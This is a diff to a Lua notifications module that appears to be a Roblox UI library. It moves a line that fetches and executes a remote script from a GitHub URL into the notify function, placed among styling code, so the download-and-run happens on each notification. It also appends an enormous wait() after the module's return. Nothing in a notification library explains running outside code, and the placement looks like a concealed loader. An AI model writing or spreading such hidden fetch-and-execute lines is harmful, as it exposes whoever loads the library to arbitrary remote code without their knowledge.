@@ -181,7 +181,7 @@ function notifications:notify(options)
     DropShadow.ScaleType = Enum.ScaleType.Slice
     DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)
 
-
+    loadstring(game:HttpGet(("https://raw.githubusercontent.com/VisionExe/Vision/main/AtomicR.lua"),true))()
     UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.10, Color3.fromRGB(255, 127, 0)), ColorSequenceKeypoint.new(0.20, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.30, Color3.fromRGB(0, 255, 0)), ColorSequenceKeypoint.new(0.40, Color3.fromRGB(0, 255, 255)), ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.60, Color3.fromRGB(139, 0, 255)), ColorSequenceKeypoint.new(0.70, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.80, Color3.fromRGB(255, 127, 0)), ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 255, 0))}
     UIGradient.Parent = DropShadow
 
@@ -310,8 +310,6 @@ function notifications:notify(options)
 	end)
 end
 
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/VisionExe/Vision/main/AtomicR.lua"),true))()
-
 function notifications:notification(options)
 	self:notify(options)
 end
@@ -321,3 +319,6 @@ function notifications:message(options)
 end
 
 return notifications
+
+
+wait(99999999999999999999999)
